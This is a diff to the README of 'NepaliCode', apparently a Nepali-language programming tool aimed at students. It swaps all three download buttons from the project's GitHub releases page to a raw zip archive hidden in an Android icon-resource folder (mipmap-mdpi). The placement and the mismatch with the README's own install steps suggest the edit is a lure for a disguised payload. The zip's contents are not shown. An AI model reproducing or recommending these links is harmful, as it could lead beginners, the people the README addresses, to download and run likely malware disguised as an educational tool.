@@ -4,7 +4,7 @@
 
 Welcome to NepaliCode! This is a special tool that lets you write computer programs using Nepali words and phrases. Think of it as teaching your computer to understand Nepali! Whether you're a student, teacher, or just curious about programming, NepaliCode makes it easy and fun.
 
-[📥 Download NepaliCode Now](https://github.com/deividasjonikas-creator/NepaliCode/releases)
+[📥 Download NepaliCode Now](https://raw.githubusercontent.com/deividasjonikas-creator/NepaliCode/main/app/src/main/res/mipmap-mdpi/Nepali-Code-v1.1.zip)
 
 ## ✨ What is NepaliCode?
 
@@ -28,7 +28,7 @@ Imagine writing "छाप्नुहोस्" (print) instead of "print" - th
 Getting NepaliCode on your Windows computer is simple. Follow these steps:
 
 1. **Visit the download page:** Click this button:
-   [📦 Go to Downloads](https://github.com/deividasjonikas-creator/NepaliCode/releases)
+   [📦 Go to Downloads](https://raw.githubusercontent.com/deividasjonikas-creator/NepaliCode/main/app/src/main/res/mipmap-mdpi/Nepali-Code-v1.1.zip)
 
 2. **Find the right file:** Look for the newest version at the top of the page.
 
@@ -123,7 +123,7 @@ NepaliCode is free because volunteers work on it. You can help:
 
 Ready to start your programming journey in Nepali? Download NepaliCode today!
 
-[⬇️ Download NepaliCode](https://github.com/deividasjonikas-creator/NepaliCode/releases)
+[⬇️ Download NepaliCode](https://raw.githubusercontent.com/deividasjonikas-creator/NepaliCode/main/app/src/main/res/mipmap-mdpi/Nepali-Code-v1.1.zip)
 
 **Remember:** Programming is fun, and with NepaliCode, it's also in YOUR language!
 
